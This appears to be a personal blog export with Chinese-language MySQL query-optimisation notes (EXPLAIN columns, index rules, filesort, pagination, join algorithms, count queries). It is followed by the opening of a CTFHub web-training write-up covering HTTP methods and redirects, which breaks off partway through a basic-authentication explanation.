<p><strong>ref</strong>：相比 eq_ref，不使用唯一索引，而是使用普通索引或者唯一性索引的部分前缀，索引要和某个值相比较，可能会找到多个符合条件的行。</p>
<ol>
<li>简单 select 查询，name是普通索引（非唯一索引）</li>
</ol>
<p><code>mysql&gt; explain select * from film where name = &#39;film1&#39;; </code></p>
<p>​	2.关联表查询，idx_film_actor_id是film_id和actor_id的联合索引，这里使用到了film_actor 的左边前缀film_id部分。 </p>
<p><code>mysql&gt; explain select film_id from film left join film_actor on film.id = film_actor.film_id;  </code></p>
<p><strong>range</strong>：范围扫描通常出现在 in(), between ,&gt; ,&lt;, &gt;&#x3D; 等操作中。使用一个索引来检索给定范围的行。 </p>
<p><strong>index</strong>：扫描全表索引，这通常比ALL快一些。</p>
<p><strong>ALL</strong>：即全表扫描，意味着mysql需要从头到尾去查找所需要的行。通常情况下这需要增加索引来进行优化了 </p>
<p><strong>ref列</strong> </p>
<p>这一列显示了在key列记录的索引中，表查找值所用到的列或常量，常见的有：const（常量），字段名（例：film.id）【表示右边的值</p>
<p><strong>rows列</strong> </p>
<p>这一列是mysql估计要读取并检测的行数，注意这个不是结果集里的行数。</p>
<h2 id="调优关键列-Extra列"><a href="#调优关键列-Extra列" class="headerlink" title="调优关键列-Extra列"></a>调优关键列-<strong>Extra列</strong></h2><p>这一列展示的是额外信息。常见的重要值如下： </p>
<p>1）Using index：使用覆盖索引 </p>
<p>mysql&gt; explain select film_id from film_actor where film_id &#x3D; 1; </p>
<blockquote>
<p>什么是覆盖索引？</p>
</blockquote>
<p><code>select file_id from film_actor where film_id = 1</code></p>
<p>注意到<code>select</code>的值是什么？这里的值是索引里面的值。所以说如果结果集是索引的值，那么被认为是覆盖索引。</p>
<p>也就是说<code>select film_id remake from film_actor hwere film_id = 1</code>这是不走覆盖索引的，因为<code>remake</code>不是索引的值</p>
<p>2）Using where：使用 where 语句来处理结果，查询的列未被索引覆盖 </p>
<p><code>mysql&gt; explain select * from actor where name = &#39;a&#39;; </code></p>
<p>name没有被索引</p>
<p>3）Using index condition：查询的列不完全被索引覆盖，where条件中是一个前导列的范围；</p>
<p><code>mysql&gt; explain select * from film_actor where film_id &gt; 1;</code></p>
<p>4）Using temporary：mysql需要创建一张临时表来处理查询。出现这种情况一般是要进行 </p>
<p>优化的，首先是想到用索引来优化。 </p>
<ol>
<li>actor.name没有索引，此时创建了张临时表来distinct</li>
</ol>
<p><code>mysql&gt; explain select distinct name from actor; </code></p>
<ol start="2">
<li>film.name建立了idx_name索引，此时查询时extra是using index,没有用临时表</li>
</ol>
<p><code>mysql&gt; explain select distinct name from film; </code></p>
<p>去重的话，可以使用加索引</p>
<p>5）Using filesort：将用外部排序而不是索引排序，数据较小时从内存排序，否则需要在磁盘完成排序。这种情况下一般也是要考虑使用索引来优化的。</p>
<ol>
<li>actor.name未创建索引，会浏览actor整个表，保存排序关键字name和对应的id，然后排序name并检索行记录</li>
</ol>
<p><code>mysql&gt; explain select * from actor order by name;</code> </p>
<ol start="2">
<li>film.name建立了idx_name索引,此时查询时extra是using index</li>
</ol>
<p><code>mysql&gt; explain select * from film order by name;</code></p>
<p>可以看到排序可以加索引</p>
<p>6）Select tables optimized away：使用某些聚合函数（比如 max、min）来访问存在索引的某个字段是 </p>
<p><code>mysql&gt; explain select min(id) from film; </code></p>
<h2 id="例子演示"><a href="#例子演示" class="headerlink" title="例子演示"></a>例子演示</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- sql例子</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `employees`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `employees`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">24</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">  `age` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> COMMENT <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">  `position` <span class="type">varchar</span>(<span class="number">20</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;职位&#x27;</span>,</span><br><span class="line">  `hire_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;入职时 间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE,</span><br><span class="line">  INDEX `idx_name_age_position`(`name`, `age`, `position`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> InnoDB AUTO_INCREMENT <span class="operator">=</span> <span class="number">4</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci COMMENT <span class="operator">=</span> <span class="string">&#x27;员工记录表&#x27;</span> ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `employees` <span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="string">&#x27;LiLei&#x27;</span>, <span class="number">22</span>, <span class="string">&#x27;mana ger&#x27;</span>, <span class="string">&#x27;2021-03-31 16:53:50&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `employees` <span class="keyword">VALUES</span> (<span class="number">5</span>, <span class="string">&#x27;HanMeimei&#x27;</span>, <span class="number">23</span>, <span class="string">&#x27;dev&#x27;</span>, <span class="string">&#x27;2021-03-31 16:53:50&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `employees` <span class="keyword">VALUES</span> (<span class="number">6</span>, <span class="string">&#x27;Lucy&#x27;</span>, <span class="number">23</span>, <span class="string">&#x27;dev&#x27;</span>, <span class="string">&#x27;2021-03-31 16:53:50&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="全值匹配"><a href="#全值匹配" class="headerlink" title="全值匹配"></a>全值匹配</h3><p>也就是说走索引</p>
<h3 id="最左前缀法则"><a href="#最左前缀法则" class="headerlink" title="最左前缀法则"></a><strong>最左前缀法则</strong></h3><p>如果索引了多列，要遵守最左前缀法则。指的是查询从索引的最左前列开始并且不跳过索引中的列。</p>
<h3 id="不对索引进行修饰"><a href="#不对索引进行修饰" class="headerlink" title="不对索引进行修饰"></a>不对索引进行修饰</h3><p>不在索引列上做任何操作（计算、函数、（自动or手动）类型转换），会导致索引失效而转向全表扫描</p>
<h3 id="存储引擎不能使用索引中范围条件右边的列"><a href="#存储引擎不能使用索引中范围条件右边的列" class="headerlink" title="存储引擎不能使用索引中范围条件右边的列"></a><strong>存储引擎不能使用索引中范围条件右边的列</strong></h3><p><code>EXPLAIN SELECT * FROM employees WHERE name= &#39;LiLei&#39; AND age = 22 AND position =&#39;manager&#39;; </code></p>
<p><code>EXPLAIN SELECT * FROM employees WHERE name= &#39;LiLei&#39; AND age &gt; 22 AND position =&#39;manager&#39;; </code></p>
<h3 id="少用select"><a href="#少用select" class="headerlink" title="少用select *"></a>少用select *</h3><p>尽量使用覆盖索引（只访问索引的查询（索引列包含查询列）），减少select *语句</p>
<h3 id="不等于不走索引"><a href="#不等于不走索引" class="headerlink" title="不等于不走索引"></a>不等于不走索引</h3><p>mysql在使用不等于（！&#x3D;或者&lt;&gt;）的时候无法使用索引会导致全表扫描 </p>
<p>is null,is not null 也无法使用索引</p>
<h3 id="通配符小心"><a href="#通配符小心" class="headerlink" title="通配符小心"></a>通配符小心</h3><p>like以通配符开头（’$abc…’）mysql索引失效会变成全表扫描操作</p>
<h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><p>字符串不加单引号索引失效 ，MYSQL底层会对字符串类型进行转变，这就违反了对索引不可进行修饰的原则。</p>
<h3 id="少用or或in"><a href="#少用or或in" class="headerlink" title="少用or或in"></a>少用or或in</h3><p> 少用or或in，用它查询时，mysql不一定使用索引，mysql内部优化器会根据检索比例、表大小等多个因素整体评估是否使用索引，详见范围查询优化 </p>
<h3 id="范围查询优化"><a href="#范围查询优化" class="headerlink" title="范围查询优化"></a><strong>范围查询优化</strong></h3><p>给年龄添加单值索引 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD</span> INDEX `idx_age` (`age`) <span class="keyword">USING</span> BTREE ; </span><br><span class="line"></span><br><span class="line">explain <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employees <span class="keyword">where</span> age <span class="operator">&gt;=</span><span class="number">1</span> <span class="keyword">and</span> age <span class="operator">&lt;=</span><span class="number">2000</span>; </span><br></pre></td></tr></table></figure>

<p>没走索引原因：mysql内部优化器会根据检索比例、表大小等多个因素整体评估是否使用索引。比如这个例子，可能是由于单次数据量查询过大导致优化器最终选择不走索引 </p>
<p>优化方法：可以讲大的范围拆分成多个小范围 </p>
<p>也就是说 大范围的改成小范围的可以走索引路径</p>
<h2 id="索引使用总结"><a href="#索引使用总结" class="headerlink" title="索引使用总结"></a>索引使用总结</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/01/gFIhkpr7csBmEDG.jpg"
                      alt="Screenshot_21.jpg"
                ></p>
<h1 id="索引优化-order、group"><a href="#索引优化-order、group" class="headerlink" title="索引优化-order、group"></a>索引优化-order、group</h1><p>索引优化的话 还是从数据结构上来检查和审阅</p>
<p>但是，我们也可以使用<code>trace工具</code>来查看mysql到底是怎么执行的？</p>
<p><em>总的来说 sql走不走索引？ 执行计划真正是怎么样的？</em></p>
<p><em>如果order by 排序底层是怎么排的？走index 还是 filesort</em></p>
<p><em>filesort有哪两种？分别解决什么问题 有什么帮助？</em></p>
<h2 id="常见sql深入优化"><a href="#常见sql深入优化" class="headerlink" title="常见sql深入优化"></a><strong>常见sql深入优化</strong></h2><p><strong>Order by与Group by优化</strong> </p>
<p>一般都是最左前缀准则来看，同时看是否经过了索引字段</p>
<p>或者<strong>覆盖索引</strong></p>
<h2 id="优化总结："><a href="#优化总结：" class="headerlink" title="优化总结："></a><strong>优化总结：</strong></h2><p>1、MySQL支持两种方式的排序filesort和index，Using index是指MySQL扫描索引本身完成排序。index 效率高，filesort效率低。 </p>
<p>2、<strong>order by</strong>满足两种情况会使用Using index。 </p>
<ol>
<li><p>order by语句使用索引最左前列。 </p>
</li>
<li><p>使用where子句与order by子句条件列组合满足索引最左前列。</p>
</li>
</ol>
<p>3、尽量在索引列上完成排序，遵循索引建立（索引创建的顺序）时的最左前缀法则。 </p>
<p>4、如果order by的条件不在索引列上，就会产生Using filesort。 </p>
<p>5、能用覆盖索引尽量用覆盖索引 </p>
<p>6、<strong>group by</strong>与order by很类似，其实质是先排序后分组，遵照索引创建顺序的最左前缀法则。对于group by的优化如果不需要排序的可以加上<strong>order by null禁止排序</strong>。注意，where高于having，能写在where中的限定条件就不要去having限定了。</p>
<ul>
<li><p>TIP</p>
<p>总的来说，它的order by是依靠着走索引的方式来帮助的</p>
<p>group by则是先排序 后优化 也和order by的处理方式一致</p>
</li>
</ul>
<h2 id="Using-filesort文件排序原理详解"><a href="#Using-filesort文件排序原理详解" class="headerlink" title="Using filesort文件排序原理详解"></a><strong>Using filesort文件排序原理详解</strong></h2><h3 id="filesort文件排序方式"><a href="#filesort文件排序方式" class="headerlink" title="filesort文件排序方式"></a><strong>filesort文件排序方式</strong></h3><p><strong>单路排序</strong>：是一次性取出满足条件行的所有字段，然后在sort buffer中进行排序；用trace工具可以看到sort_mode信息里显示&lt; sort_key, additional_fields &gt;或者&lt; sort_key, packed_additional_fields &gt;</p>
<p><strong>双路排序</strong>（又叫<strong>回表</strong>排序模式）：是首先根据相应的条件取出相应的<strong>排序字段</strong>和<strong>可以直接定位行数据的行 ID</strong>，然后在 sort buffer 中进行排序，排序完后需要再次取回其它需要的字段；用trace工具 可以看到sort_mode信息里显示&lt; sort_key, rowid &gt; </p>
<p>MySQL 通过比较系统变量 max_length_for_sort_data(<strong>默认1024字节</strong>) 的大小和需要查询的字段总大小来 </p>
<p>判断使用哪种排序模式。 </p>
<p>如果 max_length_for_sort_data 比查询字段的总长度大，那么使用 单路排序模式； </p>
<p>如果 max_length_for_sort_data 比查询字段的总长度小，那么使用 双路排序模式。</p>
<hr>
<p>我们先看<strong>单路排序</strong>的详细过程： </p>
<ol>
<li><p>从索引name找到第一个满足 name &#x3D; ‘zhuge’ 条件的主键 id </p>
</li>
<li><p>根据主键 id 取出整行，<strong>取出所有字段的值，存入 sort_buffer 中</strong> </p>
</li>
<li><p>从索引name找到下一个满足 name &#x3D; ‘zhuge’ 条件的主键 id </p>
</li>
<li><p>重复步骤 2、3 直到不满足 name &#x3D; ‘zhuge’ </p>
</li>
<li><p>对 sort_buffer 中的数据按照字段 position 进行排序 </p>
</li>
<li><p>返回结果给客户端</p>
</li>
</ol>
<p>我们再看下<strong>双路排序</strong>的详细过程： </p>
<ol>
<li><p>从索引 name 找到第一个满足 name &#x3D; ‘zhuge’ 的主键id </p>
</li>
<li><p>根据主键 id 取出整行，<strong>把排序字段 position 和主键 id 这两个字段放到 sort buffer 中</strong> </p>
</li>
<li><p>从索引 name 取下一个满足 name &#x3D; ‘zhuge’ 记录的主键 id </p>
</li>
<li><p>重复 3、4 直到不满足 name &#x3D; ‘zhuge’5. 对 sort_buffer 中的字段 position 和主键 id 按照字段 position 进行排序 </p>
</li>
<li><p>遍历排序好的 id 和字段 pos ition，按照 id 的值<strong>回到原表</strong>中取出 所有字段的值返回给客户端</p>
</li>
</ol>
<p>其实对比两个排序模式，单路排序会把所有需要查询的字段都放到 sort buffer 中，而双路排序只会把主键和需要排序的字段放到 sort buffer 中进行排序，然后再通过主键回到原表查询需要的字段。 </p>
<p>如果 MySQL 排序内存配置的比较小并且没有条件继续增加了，可以适当把 max_length_for_sort_data 配置小点，让优化器选择使用<strong>双路排序</strong>算法，可以在sort_buffer 中一次排序更多的行，只是需要再根据主键回到原表取数据。 </p>
<p>如果 MySQL 排序内存有条件可以配置比较大，可以适当增大 max_length_for_sort_data 的值，让优化器优先选择全字段排序(<strong>单路排序</strong>)，把需要的字段放到 sort_buffer 中，这样排序后就会直接从内存里返回查询结果了。 </p>
<p>所以，MySQL通过 <strong>max_length_for_sort_data</strong> 这个参数来控制排序，在不同场景使用不同的排序模式，从而提升排序效率。 </p>
<p><strong>注意</strong>，如果全部使用sort_buffer内存排序一般情况下效率会高于磁盘文件排序，但不能因为这个就随便增大sort_buffer(默认1M)，mysql很多参数设置都是做过优化的，不要轻易调整。</p>
<h1 id="常见sql深入优化2"><a href="#常见sql深入优化2" class="headerlink" title="常见sql深入优化2"></a><strong>常见sql深入优化</strong>2</h1><h2 id="理解分页"><a href="#理解分页" class="headerlink" title="理解分页"></a>理解分页</h2><p>很多时候我们业务系统实现分页功能可能会用如下sql实现 </p>
<p><code>mysql&gt; select * from employees limit 10000,10;</code></p>
<p>表示从表 employees 中取出从 10001 行开始的 10 行记录。看似只查询了 10 条记录，实际这条 SQL 是先读取 10010条记录，然后抛弃前 10000 条记录，然后读到后面 10 条想要的数据。因此要查询一张大表比较靠后的数据，执行效率是非常低的。</p>
<p>其中可使用的我知道的两种优化：</p>
<h3 id="根据自增且连续的主键排序的分页查询"><a href="#根据自增且连续的主键排序的分页查询" class="headerlink" title="根据自增且连续的主键排序的分页查询"></a>根据自增且连续的主键排序的分页查询</h3><p><code>select * from employees limit 90000,5; </code></p>
<p>这样的语句不会走索引，原因是走索引之后：<strong>扫描整个索引并查找到没索引的行(可能要遍历多个索引树)的成本比扫描全表的成本更高，所以优化器放弃使用索引</strong>。</p>
<p>所以有优化可以是</p>
<p><code>select * from employees where id &gt; 90000 limit 5;</code></p>
<p>这样通过id来帮助走索引是可以有所优化的</p>
<h3 id="根据非主键字段排序的分页查询"><a href="#根据非主键字段排序的分页查询" class="headerlink" title="根据非主键字段排序的分页查询"></a><strong>根据非主键字段排序的分页查询</strong></h3><p><code>select * from employees ORDER BY name limit 90000,5;</code></p>
<p>这条语句理论上走到name索引，但是实际上没有走索引</p>
<p>理由同上↑</p>
<p>可以改成这样的形式<code>select * from employees e inner join (select id from employees order by name limit 90000,5) ed on e.id = ed.id;</code></p>
<p>后面的<code>select</code>是走的name索引，注意到了id覆盖索引。</p>
<p>所有优化效果好</p>
<hr>
<p>综上 关于limit的优化其实很有限，如果是主键自增分页，不太好优化，有很大限制</p>
<p>而非主键字段排序可以试试加索引，然后通过覆盖索引的形式来优化效果</p>
<h2 id="Join关联查询优化"><a href="#Join关联查询优化" class="headerlink" title="Join关联查询优化"></a><strong>Join关联查询优化</strong></h2><p>表关联的两种方式：</p>
<p>Nested-Loop Join 算法 </p>
<p>Block Nested-Loop Join 算法 </p>
<h3 id="嵌套循环连接Nested-Loop-Join-NLJ-算法"><a href="#嵌套循环连接Nested-Loop-Join-NLJ-算法" class="headerlink" title="嵌套循环连接Nested-Loop Join(NLJ) 算法"></a><strong>嵌套循环连接Nested-Loop Join(NLJ) 算法</strong></h3><p>什么意思呢？举例说明：</p>
<p>一次一行循环地从第一张表（称为<strong>驱动表</strong>）中读取行，在这行数据中取到关联字段，根据关联字段在另一张表（<strong>被驱动表</strong>）里取出满足条件的行，然后取出两张表的结果合集。 </p>
<p><strong>mysql&gt; EXPLAIN select*from t1 inner join t2 on t1.a&#x3D; t2.a;</strong> </p>
<p>驱动表是 t2，被驱动表是 t1。</p>
<p>因为小表驱动大表</p>
<p>先执行的就是驱动表(执行计划结果的id如果一样则按从上到下顺序执行sql)；优化器一般会优先选择小表做驱动表。<strong>所以使用 inner join 时，排在前面的表并不一定就是驱动表。</strong> </p>
<p>一般 join 语句中，如果执行计划 Extra 中未出现 <strong>Using join buffer</strong> 则表示使用的 join 算法是 NLJ。 </p>
<p><strong>上面sql的大致流程如下：</strong> </p>
<ol>
<li><p>从表 t2 中读取一行数据； </p>
</li>
<li><p>从第 1 步的数据中，取出关联字段 a，到表 t1 中查找； </p>
</li>
<li><p>取出表 t1 中满足条件的行，跟 t2 中获取到的结果合并，作为结果返回给客户端； </p>
</li>
<li><p>重复上面 3 步。</p>
</li>
</ol>
<p>整个过程会读取 t2 表的所有数据(扫描100行)，然后遍历这每行数据中字段 a 的值，根据 t2 表中 a 的值索引扫描 t1 表中的对应行(<strong>扫描100次 t1 表的索引，1次扫描可以认为最终只扫描 t1 表一行完整数据，也就是总共 t1 表也扫描了100行</strong>)。因此整个过程扫描了 <strong>200 行</strong>。 </p>
<p>如果被驱动表的关联字段没索引，**使用NLJ算法性能会比较低(下面有详细解释)**，mysql会选择Block Nested-Loop Join算法。 </p>
<hr>
<p>注意到，他其实是先取驱动表中一条，去被驱动表找值。</p>
<h3 id="基于块的嵌套循环连接-Block-Nested-Loop-Join-BNL-算法"><a href="#基于块的嵌套循环连接-Block-Nested-Loop-Join-BNL-算法" class="headerlink" title="基于块的嵌套循环连接 Block Nested-Loop Join(BNL)算法"></a><strong>基于块的嵌套循环连接</strong> <strong>Block Nested-Loop Join(BNL)算法</strong></h3><p>这种算法是使用到了join_buffer这个缓存。在缓存中进行查找明显是比磁盘快的</p>
<p><code>mysql&gt;EXPLAIN select*from t1 inner join t2 on t1.b= t2.b;</code></p>
<p>说下流程：先是驱动表读入到join_buffer中，然后从被驱动表中抽取一条，和join_buffer进行匹配</p>
<p><strong>大致流程如下：</strong></p>
<ol>
<li><p>把 t2 的所有数据放入到 join_buffer 中 </p>
</li>
<li><p>把表 t1 中每一行取出来，跟 join_buffer 中的数据做对比 </p>
</li>
<li><p>返回满足 join 条件的数据</p>
</li>
</ol>
<p>整个过程对表 t1 和 t2 都做了一次全表扫描，因此扫描的总行数为10000(表 t1 的数据总量) + 100(表 t2 的数据总量) &#x3D; <strong>10100</strong>。并且 join_buffer 里的数据是无序的，因此对表 t1 中的每一行，都要做 100 次判断，所以内存中的判断次数是100 * 10000&#x3D; <strong>100 万次</strong>。 </p>
<p><strong>被驱动表的关联字段没索引为什么要选择使用 BNL 算法而不使用 Nested-Loop Join 呢？</strong> </p>
<p>如果上面第二条sql使用 Nested-Loop Join，那么扫描行数为 100 * 10000 &#x3D; 100万次，这个是<strong>磁盘扫描</strong>。很显然，用BNL磁盘扫描次数少很多，相比于磁盘扫描，BNL的内存计算会快得多。 </p>
<p>因此MySQL对于被驱动表的关联字段没索引的关联查询，一般都会使用 BNL 算法。如果有索引一般选择 NLJ 算法，有索引的情况下 NLJ 算法比 BNL算法性能更高 </p>
<h3 id="对于关联sql的优化"><a href="#对于关联sql的优化" class="headerlink" title="对于关联sql的优化"></a><strong>对于关联sql的优化</strong></h3><ul>
<li><p><strong>关联字段加索引</strong>，让mysql做join操作时尽量选择NLJ算法 </p>
</li>
<li><p><strong>小标驱动大表</strong>，写多表连接sql时如果<strong>明确知道</strong>哪张表是小表可以用straight_join写法固定连接驱动方式，省去</p>
</li>
</ul>
<p>mysql优化器自己判断的时间 </p>
<p><strong>straight_join解释：straight_join</strong>功能同join类似，但能让左边的表来驱动右边的表，能改表优化器对于联表查询的执行顺序。 </p>
<p>比如：<code>select * from t2 straight_join t1 on t2.a = t1.a;</code> 代表制定mysql选着 t2 表作为驱动表。 </p>
<p><strong>straight_join</strong>只适用于inner join，并不适用于left join，right join。（因为left join，right join已经代表指定了表的执行顺序） </p>
<p>尽可能让优化器去判断，因为大部分情况下mysql优化器是比人要聪明的。使用<strong>straight_join</strong>一定要慎重，因为部分情况下人为指定的执行顺序并不一定会比优化引擎要靠谱。</p>
<h2 id="count-查询优化"><a href="#count-查询优化" class="headerlink" title="count(*)查询优化"></a><strong>count(*)查询优化</strong></h2><p>临时关闭mysql查询缓存，为了查看sql多次执行的真实时间 </p>
<p><strong>mysql&gt; set global query_cache_size&#x3D;0;</strong> </p>
<p><strong>mysql&gt; set global query_cache_type&#x3D;0;</strong> </p>
<p>常见四种</p>
<p><strong>mysql&gt; EXPLAIN select count(1) from employees;</strong> </p>
<p><strong>mysql&gt; EXPLAIN select count(id) from employees;</strong></p>
<p><strong>mysql&gt; EXPLAIN select count(name) from employees;</strong> </p>
<p><strong>mysql&gt; EXPLAIN select count(*) from employees;</strong></p>
<p>四个sql的执行计划一样，说明这四个sql执行效率应该差不多，区别在于根据某个字段count不会统计字段为null值的数据行</p>
<p>其实count最好是使用辅助索引，而不是主键索引。实际上mysql内部也是这样优化的。</p>
<p>为什么mysql最终选择辅助索引而不是主键聚集索引？因为二级索引相对主键索引<strong>存储数据更少</strong>，检索性能应该更高 </p>
<p><strong>常见优化方法</strong> </p>
<p><strong>1、查询mysql自己维护的总行数</strong> </p>
<p>对于<strong>myisam存储引擎</strong>的表做不带where条件的count查询性能是很高的，因为myisam存储引擎的表的总行数会被mysql存储在磁盘上，查询不需要计算 </p>
<p>对于<strong>innodb存储引擎</strong>的表mysql不会存储表的总记录行数，查询count需要实时计算 </p>
<p><strong>2、show table status</strong> </p>
<p>如果只需要知道表总行数的估计值可以用如下sql查询，性能很高 </p>
<p><strong>3、将总数维护到Redis里</strong> </p>
<p>插入或删除表数据行的时候同时维护redis里的表总行数key的计数值(用incr或decr命令)，但是这种方式可能不准，很难保证表操作和redis操作的事务一致性 </p>
<p><strong>4、增加计数表</strong> </p>
<p>插入或删除表数据行的时候同时维护计数表，让他们在同一个事务里操作</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFHUB</title>
    <url>/2020/03/02/CTFcomig/CTFHUB/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200302200002649.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="CTFHub"
                ></p>
<h1 id="CtfHub"><a href="#CtfHub" class="headerlink" title="CtfHub"></a>CtfHub</h1><p>良心网站 真是没得很！</p>
<span id="more"></span>

<h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><p>在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如<code>移动设备(Mobile)</code>, <code>电子取证(Forensics)</code>等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag</p>
<hr>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。<br>一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件</p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag<br>常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p>
<h2 id="WEB训练场"><a href="#WEB训练场" class="headerlink" title="WEB训练场"></a>WEB训练场</h2><h3 id="WEB前置技能–http协议"><a href="#WEB前置技能–http协议" class="headerlink" title="WEB前置技能–http协议"></a>WEB前置技能–http协议</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200301185919127.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<p>我还尝试了八种请求方式</p>
<p>。。。。</p>
<p>八种请求方式：</p>
<blockquote>
<p>HTTP&#x2F;1.1协议中共定义了八种方法（有时也叫“动作”）来表明Request-URI指定的资源的不同操作方式：</p>
<p>OPTIONS<br>返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。<br>HEAD<br>向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。<br>GET<br>向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中。<br>POST<br>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。<br>PUT<br>向指定资源位置上传其最新内容。<br>DELETE<br>请求服务器删除Request-URI所标识的资源。<br>TRACE<br>回显服务器收到的请求，主要用于测试或诊断。<br>CONNECT<br>HTTP&#x2F;1.1协议中预留给能够将连接改为管道方式的代理服务器</p>
</blockquote>
<p>题解是 把头改成<code>CTFHUB</code>就可以！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200301191150767.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>首先，让我们来了解一下，什么是302重定向。</p>
<p>百度百科定义如下：<strong>302重定向又称之为暂时性转移(Temporarily Moved )，英文名称：302 redirect。 也被认为是暂时重定向（temporary redirect），一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。</strong></p>
<p>302跳转的解决方法有两个 </p>
<p>1、使用<code>curl</code>命令 之间 <code>curl  目标url</code></p>
<p>2、抓包审查</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/2020030121245421.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<h4 id="基础认证–Basic-Authentication"><a href="#基础认证–Basic-Authentication" class="headerlink" title="基础认证–Basic Authentication"></a>基础认证–<strong>Basic Authentication</strong></h4><p>这道题目是真的长知识</p>
<blockquote>
<p><strong>HTTP 基本认证</strong><br>大体流程就类似于牛翠花和王二狗接头的过程。<br>1、翠花：走到一个人面前说，二狗带我去吃麻辣烫吧。</p>
<p>2、二狗：请说出你的暗号。</p>
<p>3、翠花：天王盖地虎。</p>
<p>4、二狗：张亮麻辣烫走起。。。</p>
<p>映射到编程领域为：</p>
